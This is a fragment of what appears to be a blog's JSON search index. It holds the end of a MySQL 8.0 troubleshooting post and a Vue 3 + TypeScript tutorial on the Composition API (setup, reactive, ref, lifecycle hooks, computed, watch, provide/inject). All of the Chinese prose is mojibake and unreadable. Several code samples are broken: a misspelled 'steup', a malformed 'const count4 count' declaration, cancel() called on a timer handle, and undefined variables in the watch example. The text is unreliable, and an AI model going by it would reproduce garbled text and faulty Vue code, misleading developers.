buildç‰ˆæœ¬å°±å¥½äº†ã€‚\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/db-mysql-gui/","summary":"\u003cp\u003eå¼€å‘é¡¹ç›®ç”µè„‘ä¸­è£…ä¸Šäº†mysql8.0æ•°æ®åº“ï¼Œåœ¨ä½¿ç”¨æ•°æ®åº“æ—¶é‡è§æœªçŸ¥çš„æ„å¤–é”™è¯¯ï¼Œä¸‹é¢æ¥è®°å½•ä¸‹é—®é¢˜è§£å†³çš„è¿‡ç¨‹\u0026hellip;\u003c/p\u003e","title":"MySQL 8.0é—®é¢˜æ’æŸ¥"},{"content":"æœ¬æ–‡æ˜¯vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬3ç¯‡ã€Švue3ç»„åˆå¼apiåŠé‡è¦å±æ€§å˜æ›´ã€‹ï¼Œä¼š\u0026hellip;\nä¸€ã€å‰è¨€ åœ¨ reactÂ å’Œ vueÂ ç¤¾åŒºä¸­ä¹Ÿè¶Šæ¥è¶Šå¤šäººå¼€å§‹ä½¿ç”¨TypeScriptï¼Œä½¿ç”¨ TS å¯ä»¥å¢åŠ ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ä»å‘å¸ƒçš„ Vue3Â æ­£å¼ç‰ˆæœ¬æ¥çœ‹ï¼Œ Vue3Â çš„æºç æ˜¯ç”¨ TS ç¼–å†™çš„ï¼Œæ›´å¥½çš„ TypeScript æ”¯æŒä¹Ÿæ˜¯è¿™æ¬¡å‡çº§çš„ä¸€å¤§äº®ç‚¹ã€‚å½“ç„¶ï¼Œåœ¨å®é™…å¼€å‘ä¸­å¦‚ä½•æ­£ç¡®æ‹¥æŠ± TS ä»¥åŠå¦‚ä½•è¿ç§»åˆ° Vue3Â ä¹Ÿæ˜¯é¡¹ç›®ä¸­æˆ‘ä»¬ä¸å¾—ä¸é¢å¯¹çš„é—®é¢˜ï¼Œè¿™é‡Œé’ˆå¯¹ Vue3Â å’Œ TSå•ç‹¬åšäº†ä¸€ä¸ªç³»åˆ—å’Œå¤§å®¶åšä¸€ä¸‹äº¤æµï¼Œæœ¬ç¯‡æ˜¯ vue3+tsé¡¹ç›®ç³»åˆ—3ç¯‡ã€Švue3ç»„åˆå¼apiåŠé‡è¦å±æ€§å˜æ›´ã€‹ã€‚\næœ¬ç³»åˆ—å…¶ä»–å†…å®¹å¦‚ä¸‹:\nvue3+tsé¡¹ç›®ç³»åˆ—ç¬¬1ç¯‡ã€Švue3é¡¹ç›®ä»0åˆ°1æ­å»ºã€‹ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬2ç¯‡ã€ŠTypeScript è¯­æ³•æ±‡æ€»ã€‹ vue3+tsé¡¹ç›®ç³»åˆ—ç¬¬3ç¯‡ã€Švue3ç»„åˆå¼apiåŠé‡è¦å±æ€§å˜æ›´ã€‹ äºŒã€èƒŒæ™¯ Vueä½œä¸ºä¸€ç§æ¸è¿›å¼æ¡†æ¶ï¼Œ å€Ÿé‰´äº† React çš„ç»„ä»¶åŒ–å’Œè™šæ‹Ÿ DOMã€Angular çš„æ¨¡å—åŒ–å’ŒåŒå‘æ•°æ®ç»‘å®šã€‚éšç€ Vue 3 å†…æ ¸ API ä¸å®ç°å·²è¶‹ç¨³å®šï¼Œ å¯ä»¥çœ‹åˆ°ç›¸å¯¹vue2.xï¼ŒVue3åšäº†å¾ˆå¤šé‡è¦çš„å˜æ›´ï¼Œç‰¹åˆ«æ˜¯Composition APIçš„å¼•å…¥ã€‚\n3.0 å¯¹æ¯” 2.x çš„é‡è¦å˜æ›´æœ‰ 6 ä¸ªæ–¹é¢ï¼š\nPerformanceï¼ˆæ€§èƒ½ï¼‰: ä¼˜åŒ–äº†è™šæ‹Ÿ DOMï¼Œæœ‰äº†æ›´åŠ ä¼˜åŒ–çš„ç¼–è¯‘ï¼Œå®ç°äº†æ›´åŠ é«˜æ•ˆçš„ç»„ä»¶åˆå§‹åŒ– Rewritten virtual dom implementation ï¼ˆé‡å†™äº†è™šæ‹Ÿ DOMï¼‰ Compiler-informed fast paths ï¼ˆä¼˜åŒ–ç¼–è¯‘ï¼‰ã€ More efficient component initialization ï¼ˆæ›´é«˜æ•ˆçš„ç»„ä»¶åˆå§‹åŒ–ï¼‰ 1.3-2x better update performance ï¼ˆ1.3~2 å€çš„æ›´æ–°æ€§èƒ½ï¼‰ 2-3x faster SSR ï¼ˆ2~3 å€çš„ SSR é€Ÿåº¦ï¼‰ Tree-shaking support ï¼ˆæ”¯æŒ Tree-shakingï¼‰: æŒ‰éœ€æ±‚å¼•ç”¨çš„å†…ç½®çš„æŒ‡ä»¤å’Œæ–¹æ³• All runtime features included: 22.5kb. More features but still lighter than Vue 2ã€‚å¤§å¤šæ•°å¯é€‰åŠŸèƒ½ï¼ˆå¦‚ v-modelã€ï¼‰ç°åœ¨éƒ½æ˜¯æ”¯æŒ Tree-shaking çš„ Bare-bone HelloWorld size: 13.5kb. 11.75kb with only Composition API support All runtime features included: 22.5kb. More features but still lighter than Vue 2 Composition API Usable alongside existing Options API ï¼ˆå¯ä¸ç°æœ‰é€‰é¡¹ API ä¸€èµ·ä½¿ç”¨ï¼‰ Flexible logic composition and reuse ï¼ˆçµæ´»çš„é€»è¾‘ç»„æˆå’Œé‡ç”¨ï¼‰ Reactivity module can be used as a standalone library ï¼ˆReactivity æ¨¡å—å¯ä»¥ä½œä¸ºç‹¬ç«‹çš„åº“ä½¿ç”¨ï¼‰ Fragment, Teleport, Suspense Fragment: vue2æ—¶ï¼Œç”±äºç»„ä»¶å¿…é¡»åªæœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œå¾ˆå¤šæ—¶å€™ä¼šæ·»åŠ ä¸€äº›æ²¡æœ‰æ„ä¹‰çš„èŠ‚ç‚¹ç”¨äºåŒ…è£¹ã€‚Fragmentç»„ä»¶å°±æ˜¯ç”¨äºè§£å†³è¿™ä¸ªé—®é¢˜çš„ Teleportå…¶å®å°±æ˜¯Reactä¸­çš„Portalï¼Œæä¾›ä¸€ç§å°†å­èŠ‚ç‚¹æ¸²æŸ“åˆ°å­˜åœ¨äºçˆ¶ç»„ä»¶ä»¥å¤–çš„ DOM èŠ‚ç‚¹çš„ä¼˜ç§€çš„æ–¹æ¡ˆ å’ŒReactä¸­çš„Supenseæ˜¯ä¸€æ ·çš„ã€‚Suspense è®©ä½ çš„ç»„ä»¶åœ¨æ¸²æŸ“ä¹‹å‰è¿›è¡Œâ€œç­‰å¾…â€ï¼Œå¹¶åœ¨ç­‰å¾…æ—¶æ˜¾ç¤º fallback çš„å†…å®¹ Better TypeScript support ï¼ˆæ›´å¥½çš„ TypeScript æ”¯æŒåº¦ï¼‰ Custom Renderer API ï¼ˆè‡ªå®šä¹‰çš„ Renderer APIï¼‰ æœ¬æ–‡ä¸»è¦æ¥ä¸‹æ¥ä¸»è¦æ¶‰åŠåˆ°çš„å†…å®¹ä¸º Custom Renderer APIã€‚\nä¸‰ã€Composition API ç­‰æ ¸å¿ƒç‰¹æ€§ æ ¸å¿ƒå…³æ³¨ç‚¹:\nsetup reactive refå¼•ç”¨ \u0026amp; toRefs Lifecycle Hooks computed watch ä¾èµ–æ³¨å…¥ provide \u0026amp; inject 1ã€setup setup() å‡½æ•°æ˜¯ vue3 ä¸­ï¼Œä¸“é—¨ä¸ºç»„ä»¶æä¾›çš„æ–°å±æ€§ã€‚å®ƒä¸ºæˆ‘ä»¬ä½¿ç”¨ vue3 çš„ Composition API æ–°ç‰¹æ€§æä¾›äº†ç»Ÿä¸€çš„å…¥å£ã€‚\nsetup å‡½æ•°ç›¸å½“äº vue2.x ä¸­ beforeCreate å’Œ created, åœ¨ beforeCreate ä¹‹åã€created ä¹‹å‰æ‰§è¡Œ setupç¬¬ä¸€ä¸ªå½¢å‚ï¼Œæ¥æ”¶ props æ•°æ® setupç¬¬äºŒä¸ªå½¢å‚æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡, åœ¨ setup() å‡½æ•°ä¸­æ— æ³•è®¿é—®åˆ° this, å¯ä»¥ç”¨è¿™ä¸ªcontextæ¥è®¿é—® Tips:\nsetup ç¬¬ä¸€ä¸ªå‚æ•°æ¥å—ä¸€ä¸ªå“åº”å¼çš„propsï¼Œè¿™ä¸ªpropsæŒ‡å‘çš„æ˜¯å¤–éƒ¨çš„propsã€‚å¦‚æœä½ æ²¡æœ‰å®šä¹‰propsé€‰é¡¹ï¼Œsetupä¸­çš„ç¬¬ä¸€ä¸ªå‚æ•°å°†ä¸ºundifinedã€‚éµå¾ªvue2.xçš„åŸåˆ™\nprops å®šä¹‰ ä¸è¦åœ¨å­ç»„ä»¶ä¸­ä¿®æ”¹propsï¼›å¦‚æœä½ å°è¯•ä¿®æ”¹ï¼Œå°†ä¼šç»™ä½ è­¦å‘Šç”šè‡³æŠ¥é”™ ä¸è¦è§£æ„propsã€‚è§£æ„çš„propsä¼šå¤±å»å“åº”æ€§ ç¤ºä¾‹ï¼š\nimport { inject, defineComponent } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;ListItem\u0026#34;, props: { data: Object }, steup({data}) { console.log(\u0026#34;--userData--\u0026#34;, data); return { data }; } }); 2ã€reactive reactive() å‡½æ•°æ¥æ”¶ä¸€ä¸ªæ™®é€šå¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªå“åº”å¼çš„æ•°æ®å¯¹è±¡ã€‚\nç¤ºä¾‹ï¼š\nimport { defineComponent, onUnmounted, reactive, ref, watchEffect } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;About\u0026#34;, components: {}, setup() { const state = reactive({ msg: \u0026#39;æ¬¢è¿æ¥åˆ° \u0026#34;å…³äº vue3 å’ŒTSçš„è¯­æ³•DEMO\u0026#34;\u0026#39;, testWatchEffectCount: 0 }); // watchEffect â€”â€” 1.è‡ªåŠ¨æ”¶é›†æ•°æ®æºä½œä¸ºä¾èµ–ã€2.åªæœ‰å˜æ›´åçš„å€¼ã€3.é»˜è®¤ä¼šæ‰§è¡Œä¸€æ¬¡å¯»æ‰¾ä¾èµ–ï¼Œç„¶åå±æ€§æ”¹å˜ä¹Ÿä¼šæ‰§è¡Œ const count = ref(0); watchEffect(() =\u0026gt; { console.log(\u0026#34;--watchEffect-value--\u0026#34;, count.value); state.testWatchEffectCount = count.value; }); setInterval(() =\u0026gt; { count.value++; }, 500); const stop = watchEffect(() =\u0026gt; { console.log(\u0026#34;--stop-effect--\u0026#34;); }); // æ¸…é™¤å‰¯ä½œç”¨ watchEffect(onInvalidate =\u0026gt; { console.log(count.value, \u0026#34;0-å‰¯ä½œç”¨\u0026#34;); const token = setTimeout(() =\u0026gt; { console.log(count.value, \u0026#34;1-å‰¯ä½œç”¨\u0026#34;); }, 5000); onInvalidate(() =\u0026gt; { // count(watchEffectå‡½æ•°ä¾èµ–é¡¹) æ”¹å˜æ—¶æˆ–åœæ­¢ä¾¦å¬æ—¶ï¼Œå–æ¶ˆä¹‹å‰çš„å¼‚æ­¥æ“ä½œ token.cancel(); }); }); onUnmounted(() =\u0026gt; { stop(); }); return { state }; } }); \u0026lt;/script\u0026gt; 3ã€refå¼•ç”¨ \u0026amp; toRefs refå¸¸ç”¨äºåŸºæœ¬ç±»å‹ï¼Œreactiveç”¨äºå¼•ç”¨ç±»å‹ã€‚å¦‚æœrefä¼ å…¥å¯¹è±¡ï¼Œå…¶å®å†…éƒ¨ä¼šè‡ªåŠ¨å˜ä¸ºreactive\nref() å‡½æ•°æ ¹æ®ç»™å®šçš„å€¼åˆ›å»ºä¸€ä¸ªå“åº”å¼çš„æ•°æ®å¯¹è±¡ï¼Œè¿”å›å€¼æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¸ŠåªåŒ…å«ä¸€ä¸ª .value å±æ€§ toRefs() å‡½æ•°å¯ä»¥å°† reactive() åˆ›å»ºå‡ºæ¥çš„å“åº”å¼å¯¹è±¡ï¼Œè½¬æ¢ä¸ºæ™®é€šçš„å¯¹è±¡ï¼Œåªä¸è¿‡ï¼Œè¿™ä¸ªå¯¹è±¡ä¸Šçš„æ¯ä¸ªå±æ€§èŠ‚ç‚¹ï¼Œéƒ½æ˜¯ ref() ç±»å‹çš„å“åº”å¼æ•°æ® é€šè¿‡ ref() è¿˜å¯ä»¥å¼•ç”¨é¡µé¢ä¸Šçš„å…ƒç´ æˆ–ç»„ä»¶ï¼Œå’Œvue2çš„refæ¦‚å¿µç±»ä¼¼ å…ƒç´ å¼•ç”¨ ç»„ä»¶å¼•ç”¨ ç¤ºä¾‹ï¼šçˆ¶ç»„ä»¶\nimport { ref, reactive, toRefs, onMounted } from \u0026#39;vue\u0026#39; export default { setup()Â { const count = ref(0) //Â åˆ›å»ºå“åº”å¼æ•°æ®å¯¹è±¡Â countï¼Œåˆå§‹å€¼ä¸ºÂ 0 console.log(count.value) //Â åœ¨setupå†…è®¿é—®countå€¼éœ€è¦.valueÂ å±æ€§æ‰å¯ä»¥ï¼Œä½†åœ¨templateä¸­å¯ä»¥ç›´æ¥è®¿é—® const state = reactive({count: 0, name:\u0026#39;weedsFly\u0026#39;}) // ç”¨reactiveé›†ä¸­åˆ›å»ºå¤šä¸ªå“åº”å¼å¯¹è±¡ const add = () =\u0026gt; { // methodså†™åœ¨setupå†… state.count++ } // å…ƒç´ å¼•ç”¨ const h1Ref = ref(null) // åˆ›å»ºä¸€ä¸ª DOM å¼•ç”¨ onMounted(() =\u0026gt; { // åœ¨ DOM é¦–æ¬¡åŠ è½½å®Œæ¯•ä¹‹åï¼Œæ‰èƒ½è·å–åˆ°å…ƒç´ çš„å¼•ç”¨ h1Ref.value.style.color = \u0026#39;pink\u0026#39; // h1Ref.value æ˜¯åŸç”ŸDOMå¯¹è±¡ }) // ç»„ä»¶å¼•ç”¨ const compRef = ref(null) // åˆ›å»ºä¸€ä¸ªç»„ä»¶çš„ ref å¼•ç”¨ showCompData = () =\u0026gt; { // å±•ç¤ºå­ç»„ä»¶ä¸­ count çš„å€¼ console.log(compRef.value.count) } return { count, // ...state, // ä½¿ç”¨å±•å¼€è¿ç®—ç¬¦å ç”¨reactiveåˆ›å»ºçš„å“åº”å¼æ•°æ® å˜æˆäº† å›ºå®šçš„å€¼ ...toRefs(state), // å¯ä»¥ç”¨toRefså‡½æ•° å°†ä¼ è¿›æ¥çš„éå“åº”å¼å¯¹è±¡ è½¬æˆ ref() ç±»å‹çš„å“åº”å¼æ•°æ® add, h1Ref, compRef, showCompData } }, } ç¤ºä¾‹ï¼šå­ç»„ä»¶\nimport { ref } from \u0026#39;vue\u0026#39; export default { setup()Â { const count = ref(0) //Â å®šä¹‰å“åº”å¼çš„æ•°æ® return { count } } } 4ã€Lifecycle Hooks æ–°ç‰ˆçš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œå¯ä»¥æŒ‰éœ€å¯¼å…¥åˆ°ç»„ä»¶ä¸­ï¼Œä¸”åªèƒ½åœ¨ setup() å‡½æ•°ä¸­ä½¿ç”¨\nuse setup() beforeCreate created onBeforeMount \u0026lt;- beforeMount onMounted \u0026lt;- mounted onBeforeUpdate \u0026lt;- beforeUpdate onUpdated \u0026lt;- updated onBeforeUnmount \u0026lt;- beforeDestroy onUnmounted \u0026lt;- destroyed onErrorCaptured \u0026lt;- errorCaptured Tips:\næ— æ³•è®¾ç½® reactiveçš„state\nç¤ºä¾‹ï¼š\nimport { defineComponent, onUnmounted, reactive, ref, watchEffect } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;About\u0026#34;, components: {}, setup() { const state = reactive({ msg: \u0026#39;æ¬¢è¿æ¥åˆ° \u0026#34;å…³äº vue3 å’ŒTSçš„è¯­æ³•DEMO\u0026#34;\u0026#39;, testWatchEffectCount: 0 }); // watchEffect â€”â€” 1.è‡ªåŠ¨æ”¶é›†æ•°æ®æºä½œä¸ºä¾èµ–ã€2.åªæœ‰å˜æ›´åçš„å€¼ã€3.é»˜è®¤ä¼šæ‰§è¡Œä¸€æ¬¡å¯»æ‰¾ä¾èµ–ï¼Œç„¶åå±æ€§æ”¹å˜ä¹Ÿä¼šæ‰§è¡Œ const count = ref(0); watchEffect(() =\u0026gt; { console.log(\u0026#34;--watchEffect-value--\u0026#34;, count.value); state.testWatchEffectCount = count.value; }); setInterval(() =\u0026gt; { count.value++; }, 500); const stop = watchEffect(() =\u0026gt; { console.log(\u0026#34;--stop-effect--\u0026#34;); }); // æ¸…é™¤å‰¯ä½œç”¨ watchEffect(onInvalidate =\u0026gt; { console.log(count.value, \u0026#34;0-å‰¯ä½œç”¨\u0026#34;); const token = setTimeout(() =\u0026gt; { console.log(count.value, \u0026#34;1-å‰¯ä½œç”¨\u0026#34;); }, 5000); onInvalidate(() =\u0026gt; { // count(watchEffectå‡½æ•°ä¾èµ–é¡¹) æ”¹å˜æ—¶æˆ–åœæ­¢ä¾¦å¬æ—¶ï¼Œå–æ¶ˆä¹‹å‰çš„å¼‚æ­¥æ“ä½œ token.cancel(); }); }); onUnmounted(() =\u0026gt; { stop(); }); return { state }; } }); 5ã€computed computed() ç”¨æ¥åˆ›å»ºè®¡ç®—å±æ€§ï¼Œcomputed() å‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸€ä¸ª ref çš„å®ä¾‹\ncomputedåˆ›å»ºåªè¯»çš„è®¡ç®—å±æ€§(ä¼ å…¥ä¸€ä¸ª function å‡½æ•°ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªåªè¯»çš„è®¡ç®—å±æ€§) computedåˆ›å»ºå¯è¯»å¯å†™çš„è®¡ç®—å±æ€§ ç¤ºä¾‹:\nimport { ref, computed } from \u0026#39;vue\u0026#39; export default { setup()Â { const count = ref(0) const computedCount = computed(() =\u0026gt; count.value + 1) computedCount.value = 9 //Â computedÂ valueÂ isÂ readonly. const count2 = ref(0) const computedCount2 = computed({ get: () =\u0026gt; count2.value + 1, set: val =\u0026gt; { count2.value = val - 1 } }) computedCount2.value = 100 // ä¸ºè®¡ç®—å±æ€§èµ‹å€¼çš„æ“ä½œï¼Œä¼šè§¦å‘ set å‡½æ•° console.log(count2.value) // è§¦å‘ set å‡½æ•°åï¼Œcount çš„å€¼ä¼šè¢«æ›´æ–° return { count, computedCount, count2, computedCount2 } }, } 6ã€watch ç›‘è§†å•ä¸ªæ•°æ®æºå˜åŠ¨ ç›‘è§†å•ä¸ªreactiveåˆ›å»ºçš„æ•°æ® ç›‘è§†å•ä¸ªrefåˆ›å»ºçš„æ•°æ®æº ç›‘è§†å¤šä¸ªæ•°æ®æº ç›‘è§†å¤šä¸ªreactiveåˆ›å»ºçš„æ•°æ®æº ç›‘è§†å¤šä¸ªrefåˆ›å»ºçš„æ•°æ®æº æ¸…é™¤watchç›‘è§† åœ¨ watch ä¸­æ¸…é™¤æ— æ•ˆçš„å¼‚æ­¥ä»»åŠ¡ï¼ˆä¸èŠ‚æµé˜²æŠ–åŒæ•ˆï¼‰ ç¤ºä¾‹:\nimport { reactive, ref, watch } from \u0026#39;vue\u0026#39; export default { setup()Â { // 1-1 ç›‘è§†å•ä¸ªreactiveåˆ›å»ºçš„æ•°æ®æº const state = reactive({count: 100}) watch( () =\u0026gt; state.count, (newVal, oldVal) =\u0026gt; { console.log(newVal, oldVal)}, {lazy: true} //Â åœ¨Â watchÂ è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œä¸æ‰§è¡Œå›è°ƒå‡½æ•°ä¸­çš„ä»£ç  ) // 1-2 ç›‘è§†å•ä¸ªrefåˆ›å»ºçš„æ•°æ®æº const count2 = ref(100) const stop2 = watch( count2, (newVal, oldVal) =\u0026gt; { console.log(newVal, oldVal)}, {lazy: true} // åœ¨ watch è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œä¸æ‰§è¡Œå›è°ƒå‡½æ•°ä¸­çš„ä»£ç  ) // 2-1 ç›‘è§†å¤šä¸ªreactiveåˆ›å»ºçš„æ•°æ®æº const state3 = reactive({count: 100, name: \u0026#39;Laiyj\u0026#39;}) watch( [() =\u0026gt; state3.count, () =\u0026gt; state3.name], ([newCount, newName], [oldCount, oldName]) =\u0026gt; { console.log(newCount, oldCount) console.log(newName, oldName) }, {lazy: true} // åœ¨ watch è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œä¸æ‰§è¡Œå›è°ƒå‡½æ•°ä¸­çš„ä»£ç  ) // 2-2 ç›‘è§†å¤šä¸ªrefåˆ›å»ºçš„æ•°æ®æº const count4 count = ref(100) const name4 = ref(\u0026#39;Fei\u0026#39;) watch( [count4, name4], ([newCount, newName], [oldCount, oldName]) =\u0026gt; { console.log(newCount, oldCount) console.log(newName, oldName) }, {lazy: true} // åœ¨ watch è¢«åˆ›å»ºçš„æ—¶å€™ï¼Œä¸æ‰§è¡Œå›è°ƒå‡½æ•°ä¸­çš„ä»£ç  ) setTimeout(() =\u0026gt; { state.count++; count2++; state2.count++; state2.name = \u0026#39;lian\u0026#39;; count4++; name4 = \u0026#39;lian4\u0026#39;; }, 500) } // 3ã€æ¸…é™¤watchç›‘è§† const clearWatch = () =\u0026gt; { stop() } // 4ã€watch ä¸­æ¸…é™¤æ— æ•ˆçš„å¼‚æ­¥ä»»åŠ¡ï¼ˆä¸èŠ‚æµé˜²æŠ–åŒæ•ˆï¼‰ const keyword6 = ref(\u0026#39;\u0026#39;) const asyncPrint = (val) =\u0026gt; { // æ‰§è¡Œå¼‚æ­¥ä»»åŠ¡ï¼Œå¹¶å¾—åˆ°å…³é—­å¼‚æ­¥ä»»åŠ¡çš„ timerId return setTimeout(() =\u0026gt; { console.log(val) }, 1000) } watch( keyword6, (newVal, oldVal, onClean) =\u0026gt; { const timeId = asyncPrint() onClean(() =\u0026gt; {clearTimeout(timeId)}) // å¦‚æœ watch ç›‘å¬è¢«é‡å¤æ‰§è¡Œäº†ï¼Œåˆ™ä¼šå…ˆæ¸…é™¤ä¸Šæ¬¡æœªå®Œæˆçš„å¼‚æ­¥ä»»åŠ¡ } ) return { state, count2, state3, count4, name4 clearWatch, keyword6 } } 7ã€ä¾èµ–æ³¨å…¥ provide \u0026amp; inject provide() å’Œ inject() å¯ä»¥å®ç°åµŒå¥—ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ é€’ åªèƒ½åœ¨ setup() å‡½æ•°ä¸­ä½¿ç”¨ã€‚ çˆ¶çº§ç»„ä»¶ä¸­ä½¿ç”¨ provide() å‡½æ•°å‘ä¸‹ä¼ é€’æ•°æ®ï¼›å­çº§ç»„ä»¶ä¸­ä½¿ç”¨ inject() è·å–ä¸Šå±‚ä¼ é€’è¿‡æ¥çš„æ•°æ® Tips:\nsteup() åˆå§‹åŒ–ï¼Œåœ¨brforeCreate å‰å, æ‰€ä»¥ï¼Œå¯¹äºåŠ¨æ€ç»„ä»¶ï¼Œç±»ä¼¼ list å†…åŠ è½½ list-item, itemæ˜¯æ— æ³•æ‹¿åˆ°list provideçš„å€¼çš„\nç¤ºä¾‹ï¼šçˆ¶ç»„ä»¶\nimport { defineComponent, reactive, computed, provide, readonly, ref, onMounted } from \u0026#34;vue\u0026#34;; import ListItem from \u0026#34;./components/ListItem.vue\u0026#34;; import TestInject from \u0026#34;./components/TestInject.vue\u0026#34;; interface ListByStatusData { page: number; pageSize: number; } interface MovieItem { id: string; name: string; desc: string; } export default defineComponent({ name: \u0026#34;List\u0026#34;, components: { ListItem, TestInject }, setup() { let list: Array\u0026lt;MovieItem\u0026gt; = []; /** * @name: reactive * @desc: æ ¸å¿ƒæµç¨‹ * @author: lianpf * @date: 2021.03.06 * */ let state = reactive({ title: \u0026#34;List Page\u0026#34;, count: 0, total: 0, list, provideStatus: false }); const params = computed(() =\u0026gt; ({ count: state.count + 1 })); /** * @name: å¼‚æ­¥è¯·æ±‚å‡½æ•° \u0026amp; æ³›å‹å‡½æ•° * @desc: æ ¸å¿ƒæµç¨‹ * @author: lianpf * @date: 2021.03.06 * */ type FnType = (x: number, y: number) =\u0026gt; Promise\u0026lt;Array\u0026lt;MovieItem\u0026gt;\u0026gt;; const getInitList: FnType = (page, pageSize) =\u0026gt; { console.log(`--req-params-page:${page}-pageSize:${pageSize}--`); return new Promise((resolve, reject) =\u0026gt; { try { let res: Array\u0026lt;MovieItem\u0026gt; = [ { id: \u0026#34;100\u0026#34;, name: \u0026#34;list-item-001\u0026#34;, desc: \u0026#34;001-001-001-001\u0026#34; }, { id: \u0026#34;200\u0026#34;, name: \u0026#34;list-item-002\u0026#34;, desc: \u0026#34;002-002-002-002\u0026#34; }, { id: \u0026#34;300\u0026#34;, name: \u0026#34;list-item-003\u0026#34;, desc: \u0026#34;003-003-003-003\u0026#34; } ]; resolve(res); } catch (e) { reject(e); } }); }; // const tempList = () =\u0026gt; getInitList() let reqParams: ListByStatusData = { page: 1, pageSize: 10 }; // å¼‚æ­¥æµæ§åˆ¶å‡½æ•° const asyncFlow = async () =\u0026gt; { let resData = await getInitList(reqParams.page, reqParams.pageSize); state.count = 2; state.list = resData; list = resData; }; onMounted(async () =\u0026gt; { await asyncFlow(); }); /** * @name: ä¾èµ–æ³¨å…¥ â€”â€” çˆ¶ç»„ä»¶é€šè¿‡ provide å‡½æ•°å‘å­çº§ç»„ä»¶å…±äº«æ•°æ®ï¼ˆä¸é™å±‚çº§ï¼‰ * @desc: æ ¸å¿ƒåŠŸèƒ½ * @author: lianpf * @date: 2021.03.06 * */ const parentColor = ref(\u0026#34;salmon\u0026#34;); // provide(\u0026#39;è¦å…±äº«çš„æ•°æ®åç§°\u0026#39;, è¢«å…±äº«çš„æ•°æ®) provide(\u0026#34;themeColor\u0026#34;, readonly(parentColor)); const updateThemeColor = () =\u0026gt; { state.provideStatus = !state.provideStatus; parentColor.value = state.provideStatus ? \u0026#34;skyblue\u0026#34; : \u0026#34;salmon\u0026#34;; }; // çˆ¶ç»„ä»¶ function update â€œæ³¨å…¥â€çš„å€¼ provide(\u0026#34;updateThemeColor\u0026#34;, updateThemeColor); provide(\u0026#34;location\u0026#34;, \u0026#34;North Pole\u0026#34;); provide(\u0026#34;geolocation\u0026#34;, { longitude: 90, latitude: 135 }); return { state, params, list }; } }); \u0026lt;/script\u0026gt; ç¤ºä¾‹: å­ç»„ä»¶\nimport { inject, defineComponent } from \u0026#34;vue\u0026#34;; export default defineComponent({ name: \u0026#34;TestInject\u0026#34;, setup() { /** * @name: ä¾èµ–æ³¨å…¥ * @desc: æ ¸å¿ƒåŠŸèƒ½ â€”â€” è°ƒç”¨ inject å‡½æ•°æ—¶ï¼Œé€šè¿‡æŒ‡å®šçš„æ•°æ®åç§°ï¼Œè·å–åˆ°çˆ¶çº§å…±äº«çš„æ•°æ® * @author: lianpf * @date: 2021.03.06 * */ const userThemeColor = inject(\u0026#34;themeColor\u0026#34;); const updateThemeColor = inject(\u0026#34;updateThemeColor\u0026#34;); console.log(\u0026#34;--userThemeColor--\u0026#34;, userThemeColor); const userLocation = inject(\u0026#34;location\u0026#34;, \u0026#34;The Universe\u0026#34;); const userGeolocation = inject(\u0026#34;geolocation\u0026#34;); return { userThemeColor, updateThemeColor, userLocation, userGeolocation }; } }); \u0026lt;/script\u0026gt; å››ã€é¡¹ç›®ç»“æ„ â”œâ”€â”€ README.md â”œâ”€â”€ babel.config.js â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â”œâ”€â”€ public â”‚ â”œâ”€â”€ favicon.ico â”‚ â””â”€â”€ index.html â”œâ”€â”€ src â”‚ â”œâ”€â”€ App.vue â”‚ â”œâ”€â”€ assets â”‚ â”‚ â”œâ”€â”€ logo.png â”‚ â”‚ â””â”€â”€ styles â”‚ â”‚ â””â”€â”€ varible.styl â”‚ â”œâ”€â”€ components â”‚ â”‚ â”œâ”€â”€ HeaderNav.vue â”‚ â”‚ â””â”€â”€ HelloWorld.vue â”‚ â”œâ”€â”€ main.ts â”‚ â”œâ”€â”€ router â”‚ â”‚ â””â”€â”€ index.ts â”‚ â”œâ”€â”€ shims-vue.d.ts â”‚ â”œâ”€â”€ store â”‚ â”‚ â””â”€â”€ index.ts â”‚ â”œâ”€â”€ types â”‚ â”‚ â””â”€â”€ movie.ts â”‚ â””â”€â”€ views â”‚ â”œâ”€â”€ About.vue â”‚ â”œâ”€â”€ Detail.vue â”‚ â”œâ”€â”€ Home.vue â”‚ â”œâ”€â”€ List.vue â”‚ â””â”€â”€ components â”‚ â”œâ”€â”€ ListItem.vue â”‚ â””â”€â”€ TestInject.vue â””â”€â”€ tsconfig.json äº”ã€æºç  exampleæºç åœ°å€: vue3-ts\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ 